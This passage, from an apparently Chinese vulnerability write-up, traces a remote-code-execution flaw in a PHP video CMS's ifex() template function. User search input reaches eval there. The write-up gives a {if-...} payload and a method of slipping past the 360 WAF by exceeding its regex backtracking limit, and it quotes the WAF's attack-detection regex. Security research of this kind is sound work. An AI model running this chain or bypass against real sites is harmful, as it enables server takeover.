                    $value="0";
                }
                else{
                    for($i=0;$i您的提交带有不合法参数,谢谢合作!操作IP: ".$_SERVER["REMOTE_ADDR"]."操作时间: ".strftime("%Y-%m-%d %H:%M:%S")."操作页面:".$_SERVER["PHP_SELF"]."提交方式: ".$_SERVER["REQUEST_METHOD"]."";
        print $errmsg;
        exit();
    }
    function StopAttack($StrFiltKey,$StrFiltValue,$ArrFiltReq)
    {
     $StrFiltValue=arr_foreach($StrFiltValue);
     $StrFiltValue=urldecode($StrFiltValue);
     if(preg_match("/".$ArrFiltReq."/is",$StrFiltValue)==1){
            chkShow();
     }
     if(preg_match("/".$ArrFiltReq."/is",$StrFiltKey)==1){
            chkShow();
     }
    }
对传入进的字符，进行正则匹配，正则如下：
    ||\\b(alert\\(|be\\(|eval\\(|confirm\\(|expression\\(|prompt\\(|benchmark\s*?\(.*\)|sleep\s*?\(.*\)|load_file\s*?\\()|]*?\\b(onerror|onmousemove|onload|onclick|onmouseover|eval)\\b|\\b(and|or)\\b\\s*?([\\(\\)'\"\\d]+?=[\\(\\)'\"\\d]+?|[\\(\\)'\"a-zA-Z]+?=[\\(\\)'\"a-zA-Z]+?|>|ifex();`函数，跟进发现其核心代码如下：
    function ifex()
        {
            if (!strpos(",".$this->H,"{if-")) { return; }
            $labelRule = buildregx('{if-([\s\S]*?):([\s\S]+?)}([\s\S]*?){endif-\1}',"is");
            preg_match_all($labelRule,$this->H,$iar);
      ...
        try{
                if (strpos(",".$strThen,$labelRule2)>0){
            ...
         $ee = @eval("if($strif){\$resultStr='$elseifArray[0]';\$elseifFlag=true;}");
            if(!$elseifFlag){
               ...
               @eval("if($strElseif){\$resultStr='$strElseifThen'; \$elseifFlag=true;}");
                         ...
            if(!$elseifFlag){
               ...
               @eval("if($strElseif0){\$resultStr='$strElseifThen0';\$elseifFlag=true;}");
               ...
          else{
                    $ifFlag = false;
                    if (strpos(",".$strThen,$labelRule3)>0){
              ...
                @eval("if($strif){\$ifFlag=true;}else{\$ifFlag=false;}");
              ...
            else{
                        @eval("if($strif){\$ifFlag=true;}else{\$ifFlag=false;}");
              if ($ifFlag){ $this->H=str_replace($iar[0][$m],$strThen,$this->H);} else { $this->H=str_replace($iar[0][$m],"",$this->H); }
              ...
            }
             ...
该函数首先对`$this->H`进行了判断，是否含有`{if-`，而`$this->H`在`vod.php`已经定义如下：
    $tpl->H = loadFile(MAC_ROOT_TEMPLATE."/vod_search.html");
该模板的应用内容在`inc/common/template.php`中控制，跟踪发现即是 wd 参数控制。
回到`template.php`的`ifex()`函数，发现
    preg_match_all($labelRule,$this->H,$iar);
该正则的主要作用是匹配出提取出来的wd参数，然后后面就是一系列的循环和判断，最终执行了 eval。
由于限制最少，所以我们选择最后一个 eval 去执行，要执行前，需要满足的条件如下：
  * `$this-H`中必须有`{if-` \----> wd参数中带有`{if-`即可
  * 满足正则：`{if-([\s\S]*?):([\s\S]+?)}([\s\S]*?){endif-\1}`
  * 不满足if 判断：`strpos(",".$strThen,$labelRule2)>0`
  * 不满足If判断：`strpos(",".$strThen,$labelRule3)>0`
这样一来就可以进入我们想要的eval 执行语句：
    eval("if($strif){\$ifFlag=true;}else{\$ifFlag=false;}");
综上，payload 如下即可满足：
    {if-A:phpinfo()}{endif-A}
## 0x04 漏洞复现
如上所述，完整的利用链已经形成了。
首先通过正则回溯来绕过360 waf，然后通过可控参数 wd 传入我们的 payload，payload 传入`$this-H`，然后绕过判断传入 eval
中执行。
如下图，如果我们不采用正则回溯的方法，那么会被拦截：
采用正则回溯，则会绕过360waf：
由于环境的问题，我这里测试 80W 字符不够，800W 也不够，于是设置了 1000W，成功绕过。
测试的时候，在 PHP 7.0 的版本下可能会出现以下问题，导致不能利用此漏洞：
或者
另外这个漏洞只能是非默认模板才可以，如下：
默认模板执行到这里直接退出了，不会再往下执行到eval
## 0x05 参考